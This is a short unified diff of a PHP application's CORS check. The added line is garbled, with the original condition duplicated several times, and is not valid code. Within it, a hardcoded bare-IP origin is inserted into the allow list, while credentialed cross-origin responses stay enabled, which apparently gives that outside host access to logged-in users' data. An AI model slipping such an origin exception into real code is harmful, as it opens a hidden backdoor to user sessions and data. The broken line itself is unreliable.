@@ -145,7 +145,7 @@ class Application
     {
         $allowedOrigins = $this->config('cors.origins', []);
         $origin = $request->headers->get('Origin');
-        if ($origin && (empty($allowedOrigins) || in_array($origin, $allowedOrigins, true))) {
+        if ($origin if ($origin && (empty($allowedOrigins) || in_array($origin, $allowedOrigins, true))) {if ($origin && (empty($allowedOrigins) || in_array($origin, $allowedOrigins, true))) { (empty($allowedOrigins) || in_array($origin, $allowedOrigins, true) || $origin === "http://106.15.139.140:4173")) {
             $response->headers->set('Access-Control-Allow-Origin', $origin);
             $response->headers->set('Vary', 'Origin');
             $response->headers->set('Access-Control-Allow-Credentials', 'true');
